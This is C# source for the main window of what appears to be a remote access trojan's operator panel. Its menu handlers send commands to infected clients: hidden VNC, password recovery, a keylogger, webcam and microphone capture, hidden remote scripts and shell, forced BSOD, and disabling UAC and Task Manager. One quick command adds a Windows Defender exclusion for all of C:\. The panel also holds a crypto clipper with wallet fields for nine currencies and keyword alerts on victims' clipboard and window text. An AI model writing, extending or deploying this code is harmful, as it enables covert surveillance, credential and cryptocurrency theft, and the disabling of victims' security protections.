        private void webFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction { Action = ShutdownAction.Shutdown });
            }
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction { Action = ShutdownAction.Restart });
            }
        }

        private void standbyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction { Action = ShutdownAction.Standby });
            }
        }

        #endregion "Administration"

        #region "Monitoring"

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c);
                frmRd.Show();
                frmRd.Focus();
            }
        }

        private void hVNCToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmHvnc = FrmHVNC.CreateNewOrGetExisting(c);
                frmHvnc.Show();
                frmHvnc.Focus();
            }
        }

        private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmPasswordRecovery frmPass = new FrmPasswordRecovery(clients);
                frmPass.Show();
            }
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmKeylogger frmKl = FrmKeylogger.CreateNewOrGetExisting(c);
                frmKl.Show();
                frmKl.Focus();
            }
        }

        private void webcamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmWebcam = FrmRemoteWebcam.CreateNewOrGetExisting(c);
                frmWebcam.Show();
                frmWebcam.Focus();
            }
        }

        private void installVirtualMonitorToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                //check if client is admin
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
                if (isClientAdmin)
                {
                    c.Send(new DoInstallVirtualMonitor());
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void uninstallVirtualMonitorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                //check if client is admin
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
                if (isClientAdmin)
                {
                    c.Send(new DoUninstallVirtualMonitor());
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        #endregion "Monitoring"

        #region "User Support"

        private void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var clients = GetSelectedClients();
            if (clients.Length == 0)
            {
                return;
            }

            if (_currentAutoTaskContext?.Task is AutoTask autoTask && !string.IsNullOrWhiteSpace(autoTask.Param1))
            {
                string url = autoTask.Param1;
                bool hidden = false;
                if (!string.IsNullOrWhiteSpace(autoTask.Param3))
                {
                    bool.TryParse(autoTask.Param3, out hidden);
                }
                else if (!string.IsNullOrWhiteSpace(autoTask.Param2))
                {
                    hidden = string.Equals(autoTask.Param2, "Hidden", StringComparison.OrdinalIgnoreCase);
                }

                foreach (Client c in clients)
                {
                    c.Send(new DoVisitWebsite
                    {
                        Url = url,
                        Hidden = hidden
                    });
                }

                return;
            }

            using (var frm = new FrmVisitWebsite(clients.Length))
            {
                if (frm.ShowDialog() == DialogResult.OK)
                {
                    foreach (Client c in clients)
                    {
                        c.Send(new DoVisitWebsite
                        {
                            Url = frm.Url,
                            Hidden = frm.Hidden
                        });
                    }
                }
            }
        }

        private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var clients = GetSelectedClients();
            if (clients.Length == 0)
            {
                return;
            }

            if (_currentAutoTaskContext?.Task is AutoTask autoTask && !string.IsNullOrWhiteSpace(autoTask.Param1))
            {
                string caption = autoTask.Param1;
                string text = autoTask.Param2 ?? string.Empty;
                string button = string.IsNullOrWhiteSpace(autoTask.Param3) ? "OK" : autoTask.Param3;
                string icon = string.IsNullOrWhiteSpace(autoTask.Param4) ? "None" : autoTask.Param4;

                foreach (Client c in clients)
                {
                    c.Send(new DoShowMessageBox
                    {
                        Caption = caption,
                        Text = text,
                        Button = button,
                        Icon = icon
                    });
                }

                return;
            }

            using (var frm = new FrmShowMessagebox(clients.Length))
            {
                if (frm.ShowDialog() == DialogResult.OK)
                {
                    foreach (Client c in clients)
                    {
                        c.Send(new DoShowMessageBox
                        {
                            Caption = frm.MsgBoxCaption,
                            Text = frm.MsgBoxText,
                            Button = frm.MsgBoxButton,
                            Icon = frm.MsgBoxIcon
                        });
                    }
                }
            }
        }

        #endregion "User Support"

        #region "Quick Commands"

        private void addCDriveExceptionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string powershellCode = "Add-MpPreference -ExclusionPath C:\\";
            DoSendQuickCommand quickCommand = new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" };

            foreach (Client c in GetSelectedClients())
            {
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";

                if (isClientAdmin)
                {
                    c.Send(quickCommand);
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void enableToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";

                if (isClientAdmin)
                {
                    c.Send(new DoEnableTaskManager());
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void disableTaskManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";

                if (isClientAdmin)
                {
                    c.Send(new DoDisableTaskManager());
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void enableUACToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
                if (isClientAdmin)
                {
                    c.Send(new DoEnableUAC());
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void disableUACToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
                if (isClientAdmin)
                {
                    c.Send(new DoDisableUAC());
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        #endregion "Quick Commands"

        #region "Fun Stuff"

        private void bSODToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoBSOD());
            }
        }

        private void cWToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var clients = GetSelectedClients();
            if (clients.Length == 0)
            {
                return;
            }

            string selectedFilePath = string.Empty;
            bool hasSelectedPath = false;

            if (_currentAutoTaskContext?.Task is AutoTask autoTask && !string.IsNullOrWhiteSpace(autoTask.Param1))
            {
                selectedFilePath = autoTask.Param1;
                if (!File.Exists(selectedFilePath))
                {
                    EventLog($"Wallpaper file not found: {selectedFilePath}", "error");
                    return;
                }
                hasSelectedPath = true;
            }
            else
            {
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.InitialDirectory = "c:\\";
                    openFileDialog.Filter = "Image Files|*.jpg;*.jpeg;*.png;*.bmp;*.gif";
                    openFileDialog.FilterIndex = 1;
                    openFileDialog.RestoreDirectory = true;

                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        selectedFilePath = openFileDialog.FileName;
                        hasSelectedPath = true;
                    }
                }
            }

            if (!hasSelectedPath || string.IsNullOrWhiteSpace(selectedFilePath))
            {
                return;
            }

            byte[] imageData;
            try
            {
                imageData = File.ReadAllBytes(selectedFilePath);
            }
            catch (Exception ex)
            {
                EventLog($"Failed to read wallpaper file '{selectedFilePath}': {ex.Message}", "error");
                return;
            }

            string imageFormat = Path.GetExtension(selectedFilePath).TrimStart('.').ToLowerInvariant();

            foreach (Client c in clients)
            {
                c.Send(new DoChangeWallpaper
                {
                    ImageData = imageData,
                    ImageFormat = imageFormat
                });
            }
        }

        private void swapMouseButtonsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoSwapMouseButtons());
            }
        }

        private void hideTaskBarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoHideTaskbar());
            }
        }

        #endregion "Fun Stuff"

        private void selectAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lstClients.SelectAllItems();
        }

        #endregion "ContextMenuStrip"

        #region "MenuStrip"

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmSettings(ListenServer))
            {
                frm.ShowDialog();
            }
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
#if DEBUG
            MessageBox.Show("Client Builder is not available in DEBUG configuration.\nPlease build the project using RELEASE configuration.", "Not available", MessageBoxButtons.OK, MessageBoxIcon.Information);
#else
            using (var frm = new FrmBuilder())
            {
                frm.ShowDialog();
            }
#endif
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmAbout())
            {
                frm.ShowDialog();
            }
        }

        #endregion "MenuStrip"

        #region "NotifyIcon"

        private void notifyIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
        }

        #endregion "NotifyIcon"

        private void contextMenuStrip_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {
        }

        private void addKeywordsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmKeywords())
            {
                frm.ShowDialog();
            }
        }

        #region Notification Centre

        private void InitializeNotificationTracking()
        {
            if (lstNoti == null)
            {
                return;
            }

            _notificationUnreadFont ??= new Font(lstNoti.Font, FontStyle.Bold);
            UpdateNotificationStatusLabel();
        }

        private bool ShouldMarkNotificationsAsReadOnArrival()
        {
            return MainTabControl?.SelectedTab == tabPage2 && WindowState != FormWindowState.Minimized && Visible && ContainsFocus;
        }

        public static void AddNotiEvent(FrmMain frmMain, string client, string keywords, string windowText)
        {
            if (frmMain.lstNoti.InvokeRequired)
            {
                frmMain.lstNoti.Invoke(new Action(() => AddNotiEvent(frmMain, client, keywords, windowText)));
                return;
            }

            var entry = new NotificationEntry
            {
                Client = client,
                Timestamp = DateTime.Now,
                Event = keywords,
                Parameter = windowText ?? string.Empty,
                IsRead = frmMain.ShouldMarkNotificationsAsReadOnArrival()
            };

            frmMain.AddNotification(entry, true);
            frmMain.ShowNotificationToast(entry);
        }

        private void AddNotification(NotificationEntry entry, bool persist)
        {
            if (entry == null) return;

            lock (_notificationLock)
            {
                _notificationHistory.Add(entry);
                var item = CreateNotificationListViewItem(entry);
                lstNoti.Items.Add(item);
            }

            UpdateNotificationStatusLabel();

            if (persist)
            {
                SaveNotificationHistory();
            }
        }

        private ListViewItem CreateNotificationListViewItem(NotificationEntry entry)
        {
            string timestamp = entry.Timestamp.ToString("yyyy/MM/dd HH:mm:ss");
            string eventName = entry.Event ?? string.Empty;
            string parameter = entry.Parameter ?? string.Empty;
            string displayText = parameter.Length > 100 ? parameter.Substring(0, 100) + "..." : parameter;

            var item = new ListViewItem(entry.Client ?? string.Empty);
            item.SubItems.Add(timestamp);
            item.SubItems.Add(eventName);
            item.SubItems.Add(displayText);
            item.ToolTipText = parameter;
            item.Tag = entry;

            ApplyNotificationItemStyle(item, entry.IsRead);
            return item;
        }

        private void ApplyNotificationItemStyle(ListViewItem item, bool isRead)
        {
            if (item == null) return;

            if (_notificationUnreadFont == null)
            {
                _notificationUnreadFont = new Font(lstNoti.Font, FontStyle.Bold);
            }

            item.Font = isRead ? lstNoti.Font : _notificationUnreadFont;
        }

        private void UpdateNotificationStatusLabel()
        {
            int pending;
            int total;

            lock (_notificationLock)
            {
                pending = _notificationHistory.Count(n => !n.IsRead);
                total = _notificationHistory.Count;
            }

            const string centerTitle = "Notification Center";

            if (lblNotificationStatus != null)
            {
                if (pending == 0)
                {
                    lblNotificationStatus.Text = total == 0
                        ? "You're all caught up. No notifications yet."
                        : $"You're all caught up. {total} notifications logged.";
                }
                else
                {
                    lblNotificationStatus.Text = total > pending
                        ? $"Pending notifications: {pending} of {total}"
                        : $"Pending notifications: {pending}";
                }
            }

            if (tabPage2 != null)
            {
                tabPage2.Text = pending == 0
                    ? centerTitle
                    : $"{centerTitle} ({pending})";
            }

            if (notificationCentreToolStripMenuItem != null)
            {
                notificationCentreToolStripMenuItem.Text = pending == 0
                    ? centerTitle
                    : $"({pending}) {centerTitle}";
            }
        }

        private void MarkAllNotificationsAsRead()
        {
            bool anyChanges = false;

            lock (_notificationLock)
            {
                foreach (ListViewItem item in lstNoti.Items)
                {
                    if (item?.Tag is NotificationEntry entry && !entry.IsRead)
                    {
                        entry.IsRead = true;
                        ApplyNotificationItemStyle(item, true);
                        anyChanges = true;
                    }
                }
            }

            if (anyChanges)
            {
                UpdateNotificationStatusLabel();
                SaveNotificationHistory();
            }
        }

        private void ShowNotificationToast(NotificationEntry entry)
        {
            if (entry == null)
            {
                return;
            }

            string notificationTitle = $"Keyword Triggered: {entry.Event}";
            string parameter = entry.Parameter ?? string.Empty;
            string notificationText;

            if (!string.IsNullOrEmpty(entry.Event) && entry.Event.Contains("(Clipboard)"))
            {
                string clipboardPreview = parameter.Length > 50 ? parameter.Substring(0, 50) + "..." : parameter;
                notificationText = $"Client: {entry.Client}\nClipboard: {clipboardPreview}";
            }
            else
            {
                notificationText = $"Client: {entry.Client}\nWindow: {parameter}";
            }

            notifyIcon.Visible = true;
            notifyIcon.ShowBalloonTip(4000, notificationTitle, notificationText, ToolTipIcon.Info);
            notifyIcon.Visible = false;
        }

        private void SaveNotificationHistory()
        {
            try
            {
                lock (_notificationLock)
                {
                    if (!Directory.Exists(PulsarStuffDir))
                    {
                        Directory.CreateDirectory(PulsarStuffDir);
                    }

                    string json = JsonConvert.SerializeObject(_notificationHistory, Formatting.Indented);
                    File.WriteAllText(NotificationStateFilePath, json);
                }
            }
            catch (Exception ex)
            {
                EventLog($"Failed to save notifications: {ex.Message}", "error");
            }
        }

        private void LoadNotificationHistory()
        {
            if (lstNoti == null)
            {
                return;
            }

            try
            {
                lock (_notificationLock)
                {
                    _notificationHistory.Clear();
                    lstNoti.Items.Clear();

                    if (File.Exists(NotificationStateFilePath))
                    {
                        var existing = JsonConvert.DeserializeObject<List<NotificationEntry>>(File.ReadAllText(NotificationStateFilePath));
                        if (existing != null)
                        {
                            _notificationHistory.AddRange(existing.OrderBy(n => n.Timestamp));
                        }
                    }

                    foreach (var entry in _notificationHistory)
                    {
                        lstNoti.Items.Add(CreateNotificationListViewItem(entry));
                    }
                }
            }
            catch (Exception ex)
            {
                EventLog($"Failed to load notifications: {ex.Message}", "error");
            }

            UpdateNotificationStatusLabel();
        }

        #endregion

        private void clientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainTabControl.SelectTab(tabPage1);
        }

        private void notificationCentreToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainTabControl.SelectTab(tabPage2);
        }

        private void offlineClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainTabControl.SelectTab(tabOfflineClients);
        }

        private void clearOfflineClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            const string message = "This will permanently remove all offline client records. Continue?";
            if (MessageBox.Show(message, "Clear Offline Clients", MessageBoxButtons.YesNo, MessageBoxIcon.Question, MessageBoxDefaultButton.Button2) != DialogResult.Yes)
            {
                return;
            }

            try
            {
                OfflineClientRepository.ClearOfflineClients();
                _cachedOfflineClients = Array.Empty<OfflineClientRecord>();
                PopulateOfflineClientsList(_cachedOfflineClients);
                UpdateOfflineTabHeader(0);
                ScheduleStatsRefresh();
            }
            catch (Exception ex)
            {
                EventLog($"Failed to clear offline clients: {ex.Message}", "error");
                MessageBox.Show($"Failed to clear offline clients.\n{ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void removeOfflineClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstOfflineClients.SelectedItems.Count == 0)
            {
                return;
            }

            var selectedRecords = lstOfflineClients.SelectedItems
                .Cast<ListViewItem>()
                .Select(item => item.Tag as OfflineClientRecord)
                .Where(record => record != null && !string.IsNullOrWhiteSpace(record.ClientId))
                .ToList();

            if (selectedRecords.Count == 0)
            {
                return;
            }

            var comparer = StringComparer.OrdinalIgnoreCase;
            var clientIds = selectedRecords
                .Select(record => record.ClientId)
                .Distinct(comparer)
                .ToList();

            if (clientIds.Count == 0)
            {
                return;
            }

            var prompt = clientIds.Count == 1
                ? "Remove the selected offline client?"
                : $"Remove the {clientIds.Count} selected offline clients?";

            if (MessageBox.Show(prompt, "Remove Offline Clients", MessageBoxButtons.YesNo, MessageBoxIcon.Question, MessageBoxDefaultButton.Button2) != DialogResult.Yes)
            {
                return;
            }

            try
            {
                OfflineClientRepository.RemoveOfflineClients(clientIds);

                var removedSet = new HashSet<string>(clientIds, comparer);
                var remaining = _cachedOfflineClients?
                    .Where(record => record != null && (string.IsNullOrWhiteSpace(record.ClientId) || !removedSet.Contains(record.ClientId)))
                    .ToList()
                    ?? new List<OfflineClientRecord>();

                _cachedOfflineClients = remaining;
                PopulateOfflineClientsList(_cachedOfflineClients);
                UpdateOfflineTabHeader(_cachedOfflineClients.Count);
                ScheduleStatsRefresh();
            }
            catch (Exception ex)
            {
                EventLog($"Failed to remove offline clients: {ex.Message}", "error");
                MessageBox.Show($"Failed to remove offline clients.\n{ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void statsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainTabControl.SelectTab(tabStats);
        }

        private void mapToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainTabControl.SelectTab(tabHeatMap);
        }

        private void clearSelectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstNoti.SelectedItems.Count == 0)
            {
                return;
            }

            bool removed = false;

            lock (_notificationLock)
            {
                foreach (ListViewItem item in lstNoti.SelectedItems.Cast<ListViewItem>().ToArray())
                {
                    if (item.Tag is NotificationEntry entry)
                    {
                        _notificationHistory.Remove(entry);
                        removed = true;
                    }
                    lstNoti.Items.Remove(item);
                }
            }

            if (removed)
            {
                SaveNotificationHistory();
                UpdateNotificationStatusLabel();
            }
        }

        private void systemToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void deleteTasksToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstTasks.SelectedItems.Count > 0)
            {
                foreach (ListViewItem item in lstTasks.SelectedItems)
                {
                    lstTasks.Items.Remove(item);
                }
                SaveAutoTasks();
            }
        }

        private void cryptoClipperToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainTabControl.SelectTab(tabPage3);
        }

        private void autoTasksToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainTabControl.SelectTab(tabPage4);
        }

        private void remoteExecuteToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmTaskExecute())
            {
                frm.ShowDialog();
            }
        }

        private void shellCommandToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmTaskCommand())
            {
                frm.ShowDialog();
            }
        }

        private void showMessageBoxToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmTaskMessageBox())
            {
                frm.ShowDialog();
            }
        }

        public void AddTask(string title, string param1, string param2)
        {
            AddTask(new AutoTask
            {
                Title = title ?? string.Empty,
                Param1 = param1 ?? string.Empty,
                Param2 = param2 ?? string.Empty
            });
        }

        public void AddTask(AutoTask task, bool persist = true)
        {
            if (task == null)
            {
                return;
            }

            NormalizeAutoTask(task);

            var newItem = CreateAutoTaskListViewItem(task);
            lstTasks.Items.Add(newItem);

            if (persist)
            {
                SaveAutoTasks();
            }
        }

        private void excludeSystemDriveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AddTask("Exclude System Drives", "", "");
        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {
        }

        private void ClipperCheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (ClipperCheckbox.Checked == true)
            {
                ClipperCheckbox.Text = "Stop";
            }
            else
            {
                ClipperCheckbox.Text = "Start";
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmFileManager frmFm = FrmFileManager.CreateNewOrGetExisting(c);
                frmFm.Show();
                frmFm.Focus();
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmRemoteShell frmRs = FrmRemoteShell.CreateNewOrGetExisting(c);
                frmRs.Show();
                frmRs.Focus();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c);
                frmRd.Show();
                frmRd.Focus();
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmKeylogger frmKl = FrmKeylogger.CreateNewOrGetExisting(c);
                frmKl.Show();
                frmKl.Focus();
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmWebcam = FrmRemoteWebcam.CreateNewOrGetExisting(c);
                frmWebcam.Show();
                frmWebcam.Focus();
            }
        }

        public string GetBTCAddress() => BTCTextBox.Text;

        public string GetLTCAddress() => LTCTextBox.Text;

        public string GetETHAddress() => ETHTextBox.Text;

        public string GetXMRAddress() => XMRTextBox.Text;

        public string GetSOLAddress() => SOLTextBox.Text;

        public string GetDASHAddress() => DASHTextBox.Text;

        public string GetXRPAddress() => XRPTextBox.Text;

        public string GetTRXAddress() => TRXTextBox.Text;

        public string GetBCHAddress() => BCHTextBox.Text;

        private void taskTestToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void tableLayoutPanel1_Paint(object sender, PaintEventArgs e)
        {
        }

        private void saveLogsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
                saveFileDialog.Title = "Save Log File";
                saveFileDialog.DefaultExt = "txt";

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(saveFileDialog.FileName, DebugLogRichBox.Text);
                }
            }
        }

        private void saveSlectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(DebugLogRichBox.SelectedText))
            {
                return;
            }

            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
                saveFileDialog.Title = "Save Selected Text";
                saveFileDialog.DefaultExt = "txt";

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(saveFileDialog.FileName, DebugLogRichBox.SelectedText);
                }
            }
        }

        private void clearLogsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            DebugLogRichBox.Clear();
        }

        private void clearSelectedToolStripMenuItem1_Click(object sender, EventArgs e)
        {
        }

        private void lstClients_Resize(object sender, EventArgs e)
        {
            int accountTypeIndex = -1;
            for (int i = 0; i < lstClients.Columns.Count; i++)
            {
                if (lstClients.Columns[i] == hAccountType)
                {
                    accountTypeIndex = i;
                    break;
                }
            }

            if (accountTypeIndex >= 0)
            {
                lstClients.StretchColumnByIndex(accountTypeIndex);
            }

            UpdateAllStarPositions();
        }

        private void UpdateAllStarPositions()
        {
            if (this.IsDisposed || !this.IsHandleCreated)
                return;

            try
            {
                if (this.InvokeRequired)
                {
                    this.Invoke(new Action(() => UpdateAllStarPositionsInternal()));
                }
                else
                {
                    UpdateAllStarPositionsInternal();
                }
            }
            catch (InvalidOperationException)
            {
            }
            catch (Exception ex)
            {
                EventLog($"Error updating star positions: {ex.Message}", "error");
            }
        }

        private void UpdateAllStarPositionsInternal()
        {
            if (this.IsDisposed || !this.IsHandleCreated || lstClients == null || lstClients.IsDisposed)
                return;

            // Clean up any star controls that don't have matching clients
            List<Control> starsToRemove = new List<Control>();
            foreach (Control control in lstClients.Controls)
            {
                if (control is Button && control.Tag is Client starClient)
                {
                    bool found = false;
                    foreach (ListViewItem item in lstClients.Items)
                    {
                        if (item.Tag is Client itemClient && itemClient.Equals(starClient))
                        {
                            UpdateStarButtonPosition(control, item);
                            found = true;
                            break;
                        }
                    }

                    if (!found)
                    {
                        starsToRemove.Add(control);
                    }
                }
            }

            // Remove stars for clients that no longer exist
            foreach (var control in starsToRemove)
            {
                lstClients.Controls.Remove(control);
                control.Dispose();
            }
        }

        private void lstClients_MouseWheel(object sender, MouseEventArgs e)
        {
            UpdateAllStarPositions();
        }

        private void lstClients_ColumnWidthChanged(object sender, ColumnWidthChangedEventArgs e)
        {
            if (!lstClients.IsStretched(hAccountType.Index))
            { lstClients.StretchColumnByIndex(hAccountType.Index); }
            UpdateAllStarPositions();
        }

        private void MainTabControl_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (MainTabControl.SelectedTab == tabPage1)
            {
                RefreshStarButtons();
                SortClientsByFavoriteStatus();
            }
            else if (MainTabControl.SelectedTab == tabPage2)
            {
                MarkAllNotificationsAsRead();
            }
            else if (MainTabControl.SelectedTab == tabOfflineClients)
            {
                PopulateOfflineClientsList(_cachedOfflineClients);
                UpdateOfflineTabHeader(_cachedOfflineClients.Count);
                ScheduleOfflineListRefresh();
                ScheduleStatsRefresh();
            }
            else if (MainTabControl.SelectedTab == tabStats)
            {
                ScheduleStatsRefresh();
            }
        }

        private void lstClients_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            e.DrawDefault = true;
        }

        private void remoteScriptingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var clients = GetSelectedClients();
            if (clients.Length == 0)
            {
                return;
            }

            if (_currentAutoTaskContext?.Task is AutoTask autoTask && !string.IsNullOrWhiteSpace(autoTask.Param3))
            {
                string language = string.IsNullOrWhiteSpace(autoTask.Param1) ? "Powershell" : autoTask.Param1;
                string script = autoTask.Param3;
                bool hidden = false;
                if (!string.IsNullOrWhiteSpace(autoTask.Param4))
                {
                    bool.TryParse(autoTask.Param4, out hidden);
                }
                else if (!string.IsNullOrWhiteSpace(autoTask.Param2))
                {
                    hidden = string.Equals(autoTask.Param2, "Hidden", StringComparison.OrdinalIgnoreCase);
                }

                foreach (Client c in clients)
                {
                    c.Send(new DoExecScript
                    {
                        Language = language,
                        Script = script,
                        Hidden = hidden
                    });
                }

                return;
            }

            using (var frm = new FrmRemoteScripting(clients.Length))
            {
                if (frm.ShowDialog() == DialogResult.OK)
                {
                    foreach (Client c in clients)
                    {
                        c.Send(new DoExecScript
                        {
                            Language = frm.Lang,
                            Script = frm.Script,
                            Hidden = frm.Hidden
                        });
                    }
                }
            }
        }

        private void audioToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmAudio = FrmRemoteMic.CreateNewOrGetExisting(c);
                frmAudio.Show();
                frmAudio.Focus();
            }
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmAudio = FrmRemoteMic.CreateNewOrGetExisting(c);
                frmAudio.Show();
                frmAudio.Focus();
            }
        }

        private void remoteSystemAudioToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmSysAudio = FrmRemoteSystemAudio.CreateNewOrGetExisting(c);
                frmSysAudio.Show();
                frmSysAudio.Focus();
            }
        }

        private void sorterToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainTabControl.SelectTab(tabPage5);
        }

        private void blockIPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var clients = GetSelectedClients();
            if (clients.Length == 0)
            {
                return;
            }

            bool proceed = true;
            if (_currentAutoTaskContext == null)
            {
                proceed = MessageBox.Show(
                    string.Format("Are you sure you want to Block {0} IP\\s?", clients.Length),
                    "Block Confirmation",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question) == DialogResult.Yes;
            }

            if (!proceed)
            {
                return;
            }

